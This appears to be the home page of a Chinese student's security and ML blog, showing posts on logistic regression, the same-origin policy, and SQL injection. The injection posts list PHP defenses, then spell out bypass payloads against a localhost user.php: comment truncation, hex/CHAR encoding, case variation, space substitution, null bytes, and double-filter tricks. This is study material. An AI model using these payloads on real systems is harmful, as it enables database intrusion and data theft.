<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-center-atom.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Alisita's blogs" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta property="og:type" content="website">
<meta property="og:title" content="Alisita&#39;s blogs">
<meta property="og:url" content="https://alisitaweb.github.io/index.html">
<meta property="og:site_name" content="Alisita&#39;s blogs">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Alisita&#39;s blogs">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.2',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://alisitaweb.github.io/"/>





  <title>Alisita's blogs</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>
    <a href="https://github.com/AlisitaWeb"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/38ef81f8aca64bb9a64448d0d70f1308ef5341ab/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6461726b626c75655f3132313632312e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png"></a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Alisita's blogs</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">一只准备考研的苦逼学生</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-schedule">
          <a href="/schedule/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
            
            日程表
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            公益404
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2018/01/08/机器学习logistic回归1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/08/机器学习logistic回归1/" itemprop="url">logistic回归</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-08T22:40:48+08:00">
                2018-01-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="二分分类"><a href="#二分分类" class="headerlink" title="二分分类"></a>二分分类</h3><p>假如有一张图片需要识别是否是猫作为输入，如果是猫，输出1，否则，输出0<br>图片在计算机中保存，要分为三个矩阵，分别对应红绿蓝三个颜色通道，<br>为了方便，这里用5X4的演示</p>
<p>把这些亮度值，放入一个特征向量(feature vector)x中<br><code>x=[255,251,.......,255,134.....]</code><br>如果图片是64X64的，向量x的总维度<br>64X    64X3 = 12288<br><code>nx=12288</code><br>来表示向量x的总维度<br>在二分分类问题中，目的是训练出一个分类器，以图片的特征向量作为输入量，预测输出的y是0，还是1</p>
<p>用(x,y)来表示一个样本，训练集有m个集合组成<br><code>{(x^(1),y^(1)},(x^(2),y^(2)),.....(x^(m),y^(m))}</code><br>表示整个训练集<br><code>m_train</code><br>表示训练集<br><code>m_test</code><br>表示测试集<br>为了更好的表示，定义一个大矩阵X,<br><code>X=[...... x^(1)...... , .......x^(2)........ , ..... , ......x^(m)......]</code><br>这个矩阵有m列，有nx行<br>定义一个矩阵Y<br><code>Y=[y^(1),y^(2),.....y^(m)]</code><br>=<a href="./attachments/C1W2L01%20notes.pdf">enter description here</a><br>=<a href="./attachments/C1W2L01%20slides.pdf">enter description here</a></p>
<h3 id="logisitic回归-logistic-Regression"><a href="#logisitic回归-logistic-Regression" class="headerlink" title="logisitic回归(logistic Regression)"></a>logisitic回归(logistic Regression)</h3><p>已知输入向量x，例如是一张图片，判断是否是猫图，需要一个算法，得出预测值ŷ，ŷ是一个概率(当x满足条件是，y就是1)<br>x是一个nx维向量，参数w也是一个nx维向量，b是一个实数<br><code>ŷ = sigmoid(w^T * x + b)</code><br>sigmoid是为了将概率限制在[0,1]</p>
<h3 id="logisitic回归损失函数-logistic-Regression-cost-function"><a href="#logisitic回归损失函数-logistic-Regression-cost-function" class="headerlink" title="logisitic回归损失函数(logistic Regression cost function)"></a>logisitic回归损失函数(logistic Regression cost function)</h3><p>Loss(error)function:<br>    <code>L(ŷ,y)=-(ylogŷ+(1-y)log(1-ŷ))</code><br>Cost function:<br>    <code>J(w,b) = 1/m * L(ŷ^(i),y^(i)) = -1/m * ( y^(i)logŷ^(i) + (1-y^(i)log(1-ŷ^(i)))</code><br>    i = [1,m]<br>要让J越小越好</p>
<h3 id="logistic回归中的梯度下降法"><a href="#logistic回归中的梯度下降法" class="headerlink" title="logistic回归中的梯度下降法"></a>logistic回归中的梯度下降法</h3><p>对于单个样本<br>假设有两个样本特征向量x1,x2,<br>参数w1，w2，b<br><code>z = w1x1 + w2x2 + b</code><br><code>ŷ = a = sigmoid(z)</code><br><code>L(a,y)</code><br>然后向前求导数<br><code>da = dL(a,y)/da = -(y/a)+(1-y)/(1-a)</code><br><code>dz = dL/dz = a-y</code><br><code>dw1 = x1 * dz</code><br><code>dw2 = x2 * dz</code><br><code>db = dz</code><br>然后更新w1,w2,b<br><code>w1 = w1 - αdw1</code><br><code>w2 = w2 - αdw2</code><br><code>b = b - αdb</code></p>
<p>对于m各训练样本<br>下面实现的是伪代码<br><code>J=0; dw1=0; dw2=0;db=0;
 for i=1 to m
     z^(i) = w^T*x^(i) + b
    a^(i) = sigmoid(z^i)
    J += -( y^(i)loga^(i) + (1-y^(i)log(1-a^(i)))
    dz^(i) = a^(i) - y^(i)
    dw1 += x1^(i)dz^(i)
    dw2 += x2^(i)dz^(i)
    db += dz^(i)
 J /= m
 dw1 /= m    注释 dw1 = dJ/dw1
 dw2 /= m
 db /= m
 w1 = w1 - αdw1
 w2 = w2 - αdw2
 b = b - αdb</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/25/MySQL偏门技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/25/MySQL偏门技巧/" itemprop="url">MySQL偏门技巧</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-25T10:53:03+08:00">
                2017-09-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
                    <span itemprop="name">SQL Injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="group-by-with-rollup的用法"><a href="#group-by-with-rollup的用法" class="headerlink" title="group by with rollup的用法"></a>group by with rollup的用法</h3><p>这个主要用来绕过查询结果行数是否唯一，再验证所得密码是否相同<br>直接上图看的清楚一些<br><img src="./images/TIM%E6%88%AA%E5%9B%BE20170925100537.png" alt="enter description here" title="TIM截图20170925100537"></p>
<h3 id="绕过未知字段名的技巧"><a href="#绕过未知字段名的技巧" class="headerlink" title="绕过未知字段名的技巧"></a>绕过未知字段名的技巧</h3><p>逗号用join绕过，使用联合查询<br>limit 1,1 —-&gt; limit 1 offset 1<br><a href="http://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/" target="_blank" rel="external">原文</a><br><a href="http://www.venenof.com/index.php/archives/240/" target="_blank" rel="external">原文2</a><br>真的是涨姿势</p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/19/SQL注入防御与绕过的几种姿势/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/19/SQL注入防御与绕过的几种姿势/" itemprop="url">SQL注入防御与绕过的几种姿势</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-19T15:11:00+08:00">
                2017-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
                    <span itemprop="name">SQL Injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="PHP防御的几种姿势"><a href="#PHP防御的几种姿势" class="headerlink" title="PHP防御的几种姿势"></a>PHP防御的几种姿势</h3><h4 id="1-关闭错误提示"><a href="#1-关闭错误提示" class="headerlink" title="1.关闭错误提示"></a>1.关闭错误提示</h4><p>说明：<br>PHP配置文件php.ini中的display_errors=Off</p>
<h4 id="2-魔术引号"><a href="#2-魔术引号" class="headerlink" title="2.魔术引号"></a>2.魔术引号</h4><p>说明：<br>当php.ini里的magic_quotes_gpc=On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符<br>魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）<br>PHP 5.4 之前PHP指令magic_quotes_gpc默认是on<br>在PHP5.4.0起magic_quotes_gpc将始终返回FALSE</p>
<h4 id="3-addslashes"><a href="#3-addslashes" class="headerlink" title="3.addslashes"></a>3.addslashes</h4><p>addslashes函数，它会在指定的预定义字符前添加反斜杠转义，这些预定义的字符是：单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）<br>这个函数的作用和magic_quotes_gpc一样。所以一般用addslashes前会检查是否开了magic_quotes_gpc</p>
<p>magic_quotes_gpc与addslashes的区别用法：</p>
<p><strong>1）对于magic_quotes_gpc=on的情况</strong><br>我们可以不对输入和输出数据库的字符串数据作addslashes()和stripslashes()的操作,数据也会正常显示<br>如果此时你对输入的数据作了addslashes()处理，那么在输出的时候就必须使用stripslashes()去掉多余的反斜杠<br><strong>2）对于magic_quotes_gpc=off 的情况</strong><br>必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出<br>因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p>
<h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h4><p>mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符<br>下列字符受影响<br><code>\x00</code><br><code>\n</code><br><code>\r</code><br><code>\</code><br><code>&#39;</code><br><code>&quot;</code><br><code>\x1a</code><br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false<br>因为完全性问题，建议使用拥有Prepared Statement机制的PDO和MYSQLi来代替mysql_query，使用的是mysqli_real_escape_string</p>
<h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h4><p>htmlspecialchars()函数把预定义的字符转换为 HTML实体<br>预定义的字符是:<br>`&amp; -&gt; &amp;<br> “  -&gt; &quot;<br>  ‘  -&gt; &#039;<br>  &lt; -&gt; &lt;</p>
<blockquote>
<p>-&gt; &gt;`</p>
</blockquote>
<h4 id="用正则匹配替换来过滤指定的字符"><a href="#用正则匹配替换来过滤指定的字符" class="headerlink" title="用正则匹配替换来过滤指定的字符"></a>用正则匹配替换来过滤指定的字符</h4><p><code>preg_match
 preg_match_all()
 preg_replace</code></p>
<h4 id="转换数据类型"><a href="#转换数据类型" class="headerlink" title="转换数据类型"></a>转换数据类型</h4><p>根据「检查数据类型」的原则，查询之前要将输入数据转换为相应类型，如uid都应该经过intval函数格式为int型</p>
<h4 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h4><p>绑定变量使用预编译语句是预防SQL注入的最佳方式，因为使用预编译的SQL语句语义不会发生改变，在SQL语句中，变量用问号?表示，攻击者无法改变SQL语句的结构，从根本上杜绝了SQL注入攻击的发生</p>
<h3 id="几种绕过姿势"><a href="#几种绕过姿势" class="headerlink" title="几种绕过姿势"></a>几种绕过姿势</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><p>绕过：<br>1.将字符串转为16进制编码数据或使用char函数（十进制）进行转化（因为数据库会自动把16进制转化）<br>2.用注释符去掉输入密码部分如”–/*#”</p>
<p>payload:<br><code>http://localhost/injection/user.php?username=admin--</code><br>注意– 后的空格<br><code>http://localhost/injection/user.php?username=admin/*</code><br>（escape不转义/*  )</p>
<p><code>http://localhost/injection/user.php?username=admin%23</code><br>（这里的%23即为#，注释掉后面的密码部分。注意IE浏览器会将#转换为空）<br><code>http://localhost/injection/user.php?username=0x61646d696e23</code><br>（admin# –&gt;0x61646d696e23）<br><code>http://localhost/injection/user.php?username=CHAR(97,100, 109, 105, 110, 35)</code><br>（admin# –&gt;CHAR(97, 100, 109, 105, 110, 35)）</p>
<p>关于编码原理：</p>
<p>因为一般前端JavaScript都会escape()、encodeURL或encodeURIComponent编码再传输给服务器，主要为encodeURL，如下，所以可以利用这点</p>
<p>1)escape( )<br>对ASCII字母、数字、标点符号”@* _ + - . /“不进行编码。在\u0000到\u00ff之间的符号被转成%xx的形式，其余符号被转成%uxxxx的形式。（注意escape()不对”+”编码，而平时表单中的空格会变成+）</p>
<p>2) encodeURL<br>对” ;  / ? : @ &amp; = + $ , # ‘ “不进行编码。编码后，它输出符号的utf-8形式，并且在每个字节前加上%。</p>
<p>3) encodeURIComponent<br>用于对URL的组成部分进行个别编码，而不用于对整个URL进行编码。<br>常用编码：<br><code>@ * _ + - ./ ;  \ ? : @ &amp; = + $ , # &#39; 空格</code></p>
<p>转码工具可用：<br><a href="http://evilcos.me/lab/xssor/" target="_blank" rel="external">http://evilcos.me/lab/xssor/</a> </p>
<h4 id="匹配过滤"><a href="#匹配过滤" class="headerlink" title="匹配过滤"></a>匹配过滤</h4><p>preg_match<br>绕过：<br>关键词 and,or 常被用做简单 测试网站是否容易进行注入攻击<br>过滤注入： 1 or 1 = 1    1 and 1 = 1<br>绕过注入： 1 || 1 = 1    1 &amp;&amp; 1 = 1<br><a href="http://www.cnblogs.com/croot/p/3450262.html" target="_blank" rel="external">混淆和绕过</a></p>
<h4 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h4><p>strstr ()查找字符串的首次出现，该函数区分大小写。如果想要不区分大小写，使用stristr()。(注意后面这个函数多了个i)<br>绕过：<br>strstr()函数是对大小写敏感的，所以我们可以通过大小写变种来绕过<br>payload：<br><code>http://localhost/injection/user.php?id=1uNion select null,null,null</code></p>
<h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h4><p>绕过：<br>1)使用内联注释。<br>2)使用换行符代替空格。注意服务器若为Windows则换行符为%0A%0D，Linux则为%0A<br>payload:<br><code>http://localhost/injection/user.php?id=1/**/and/**/1=1</code><br><code>http://localhost/injection/user.php?id=1%0A%0Dand%0A%0D1=1</code></p>
<h4 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h4><p>通常的输入过滤器都是在应用程序之外的代码实现的。比如入侵检测系统（IDS），这些系统一般是由原生编程语言开发而成，比如C++，为什么空字节能起作用呢，就是因为在原生变成语言中，根据字符串起始位置到第一个出现空字节的位置来确定字符串长度。所以说空字节就有效的终止了字符串</p>
<p>绕过：<br>只需要在过滤器阻止的字符串前面提供一个采用URL编码的空字节即可。</p>
<p>payload:<br>%00</p>
<h4 id="构造故意过滤"><a href="#构造故意过滤" class="headerlink" title="构造故意过滤"></a>构造故意过滤</h4><p>将传入的%27和%2527都进行删除处理，也就是还没传入数据库前就已经被该死的程序吃了，但是在看到他还吃了<em>，这样我们就有办法了，我们构造%</em>27，这样程序吃掉星号*后，%27就会被传入</p>
<p>payload：<br><code>http://localhost/injection/user.php?id%3D1%*27%*20and%*20%*271%*27%3D%*271</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/16/浏览器同源策略/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/16/浏览器同源策略/" itemprop="url">浏览器同源策略</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-16T12:00:23+08:00">
                2017-09-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="external">原文链接</a></p>
<p>同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的关键的安全机制</p>
<h3 id="一个源的定义"><a href="#一个源的定义" class="headerlink" title="一个源的定义"></a>一个源的定义</h3><p>如果协议，端口（如果指定了一个）和域名对于两个页面是相同的，则两个页面具有相同的源<br>下面给出了相对<a href="http://store.company.com/dir/page.html" target="_blank" rel="external">http://store.company.com/dir/page.html</a> 同源检测的示例</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>结果</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://store.company.com/dir2/other.html" target="_blank" rel="external">http://store.company.com/dir2/other.html</a></td>
<td>True</td>
<td></td>
</tr>
<tr>
<td><a href="http://store.company.com/dir/inner/another.html" target="_blank" rel="external">http://store.company.com/dir/inner/another.html</a></td>
<td>True</td>
<td></td>
</tr>
<tr>
<td><a href="https://store.company.com/secure.html" target="_blank" rel="external">https://store.company.com/secure.html</a></td>
<td>False</td>
<td>不同协议（https和http）</td>
</tr>
<tr>
<td><a href="http://store.company.ocm:81/dir/etc.html" target="_blank" rel="external">http://store.company.ocm:81/dir/etc.html</a></td>
<td>False</td>
<td>不同端口（81和80）</td>
</tr>
<tr>
<td><a href="http://news.company.com/dir/other.html" target="_blank" rel="external">http://news.company.com/dir/other.html</a></td>
<td>False</td>
<td>不同域名（news和store）</td>
</tr>
</tbody>
</table>
<p>还有参考<a href="https://developer.mozilla.org/en-US/docs/Same-origin_policy_for_file:_URIs" target="_blank" rel="external">文件的源定义</a></p>
<h3 id="源的继承"><a href="#源的继承" class="headerlink" title="源的继承"></a>源的继承</h3><p>来自 about:blank 和 javascript:URL 的内容从加载URL的文档继承原始文档，因为URL本身不提供任何有关原点的信息。data:URLs 获得一个新的，空的安全上下文</p>
<p><strong>注意：</strong> 在Gecko 6.0 之前，如果用户在位置栏中输入data URLs,data URLs将继承当前浏览器窗口中网页的安全上下文。</p>
<p><strong>IE 例外</strong><br>当涉及到同源策略是，Internet Explorer有主要的两个例外</p>
<ul>
<li>授信范围：两个相互之间高度互信的域名，如公司域名，不遵守同源策略的限制</li>
<li>端口：IE未将端口号加入到同源策略的组成部分之中，因此 <a href="http://company.com:81/index.html" target="_blank" rel="external">http://company.com:81/index.html</a> 和 <a href="http://company.com/index.html" target="_blank" rel="external">http://company.com/index.html</a> 属于同源并且不受任何限制</li>
</ul>
<h3 id="源的更改"><a href="#源的更改" class="headerlink" title="源的更改"></a>源的更改</h3><p>页面可能会更改自己的来源，但有一些限制。脚本可以将 <code>document.domain</code> 的值设置为其当前域或其当前域的超级域，如果将其设置为其当前域的超级域，则较短的域将用于后续原始检查。<br>例如：假设文档中的一个脚本在 <a href="http://store.company.com/dir/other.html" target="_blank" rel="external">http://store.company.com/dir/other.html</a> 执行以下语句<br><code>document.domain = &quot;company.com&quot;;</code><br>这条语句执行之后，页面将会成功地通过对 <a href="http://company.com/dir/page.html" target="_blank" rel="external">http://company.com/dir/page.html</a> 的同源检测。同理，<code>compan.com</code> 不能设置 <code>document.domain</code> 为 <code>othercompany.com</code></p>
<p>浏览器单独保存端口号。任何的赋值操作，包括 <code>document.domain = document.domian</code>都会以 <code>null</code> 值覆盖掉原来的端口号，因此 <code>company.com:8080</code> 页面的脚本不能仅通过设置 <code>document.domain = &quot;company.com&quot;</code> 就是与 <code>company.com</code> 通信。赋值是必须带上端口号，以确保端口号不会为 <code>null</code></p>
<p><strong>注意：</strong> 使用document.domain允许子域安全访问其父域时，需要设置 document.domain 在父域和子域中具有相同的值，虽然这样做只是将父域设置回其原始值，不做的话可能会导致权限错误</p>
<h3 id="跨源网络访问"><a href="#跨源网络访问" class="headerlink" title="跨源网络访问"></a>跨源网络访问</h3><p>同源策略控制了不同源之间的交互，例如在使用XMLHTTPRequest或<img>标签时则会收到同源策略的约束，交互通常分为三类：</p>
<ul>
<li>通常允许进行跨域操作（Cross-orgin writers） 例如：链接（links）,重定向以及表单提交，特定少数的HTTP请求需要添加preflight</li>
<li>通常允许跨域资源嵌入（Cross-orgin embedding） </li>
<li>通常不允许跨域读操作（Cross-orgin reads）。但常可以通过内嵌资源来巧妙的进行读取访问 例如可以读取图片的高度和宽度，调用内嵌脚本的方法</li>
</ul>
<p>下面是可能嵌入跨源的资源的一些示例：</p>
<ul>
<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到</li>
<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>标签嵌入css，由于css的，css的跨域需要一个设置正确的Content-Type消息头，不同浏览器有不同的限制</li>
<li><code>&lt;img&gt;</code>嵌入图片。支持的图片格式包括PNG，JPEG，GIF，BMP，SVG</li>
<li><code>&lt;video&gt;</code>和<code>&lt;audio&gt;</code>嵌入多媒体资源</li>
<li><code>&lt;object&gt;</code>,<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>的插件</li>
<li><code>@font-face</code>引入的字体，一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）</li>
<li><code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>载入的任何资源，站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互</li>
</ul>
<h3 id="如何允许跨域访问"><a href="#如何允许跨域访问" class="headerlink" title="如何允许跨域访问"></a>如何允许跨域访问</h3><p>使用CORS允许跨源访问</p>
<h3 id="如何阻止跨源访问"><a href="#如何阻止跨源访问" class="headerlink" title="如何阻止跨源访问"></a>如何阻止跨源访问</h3><ul>
